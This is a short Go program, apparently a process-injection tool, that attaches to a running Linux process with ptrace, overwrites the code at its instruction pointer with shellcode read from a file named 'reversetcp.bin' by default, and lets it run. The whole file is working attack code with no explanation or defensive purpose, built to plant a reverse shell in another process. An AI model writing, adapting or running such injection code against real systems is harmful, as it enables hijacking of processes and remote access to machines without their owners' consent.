package main

import (
	"flag"
	"io/ioutil"
	"syscall"
)

func main() {
	var pid  = flag.Int("p", 3064, "pid")
	var file = flag.String("f", "./reversetcp.bin", "shellcode file")
	flag.Parse()

	shellcode, err := ioutil.ReadFile(*file)
	if err != nil {
		println(err.Error())
		return
	}
	err = syscall.PtraceAttach(*pid)
	if err != nil {
		println(err.Error())
		return
	}

	var wait *syscall.WaitStatus
	var r *syscall.Rusage
	syscall.Wait4(*pid, wait, syscall.WUNTRACED, r)
	

	proc := &syscall.PtraceRegs{}
	err = syscall.PtraceGetRegs(*pid, proc)
	if err != nil {
		println(err.Error())
		return
	}

	dst := uintptr(proc.Rip)
	src := shellcode

	_,err = syscall.PtracePokeText(*pid, dst, src)
	if err != nil {
		println(err.Error())
		return
	}

	proc.Rip+=2
	err = syscall.PtraceSetRegs(*pid, proc)
	if err != nil {
		println(err.Error())
		return
	}
	err = syscall.PtraceDetach(*pid)
	if err != nil {
		println(err.Error())
		return
	}
}
